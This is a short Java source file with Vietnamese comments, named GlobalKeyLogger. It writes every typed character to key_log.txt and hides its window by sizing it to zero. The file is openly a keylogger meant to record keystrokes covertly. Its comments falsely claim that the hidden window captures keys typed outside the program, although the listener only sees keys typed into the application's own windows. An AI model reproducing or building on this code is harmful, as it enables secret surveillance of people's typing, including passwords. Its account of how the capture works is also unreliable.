/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylog;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.*;

public class GlobalKeyLogger {
    private BufferedWriter writer;

    public GlobalKeyLogger() {
        try {
            // Mở tệp để ghi
            writer = new BufferedWriter(new FileWriter("key_log.txt"));
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Bắt đầu lắng nghe sự kiện phím
        try {
            KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(new KeyEventDispatcher() {
                @Override
                public boolean dispatchKeyEvent(KeyEvent e) {
                    if (e.getID() == KeyEvent.KEY_TYPED) {
                        try {
                            // Ghi ký tự vào tệp
                            writer.write(e.getKeyChar());
                            writer.flush();
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                    return false;
                }
            });
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        GlobalKeyLogger keyLogger = new GlobalKeyLogger();
        // Tạo một cửa sổ JFrame trống để có thể nhận sự kiện phím từ bên ngoài
        JFrame frame = new JFrame("Global Key Logger");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(0, 0); // Đặt kích thước cửa sổ là 0x0 để ẩn cửa sổ
        frame.setVisible(true);
    }
}
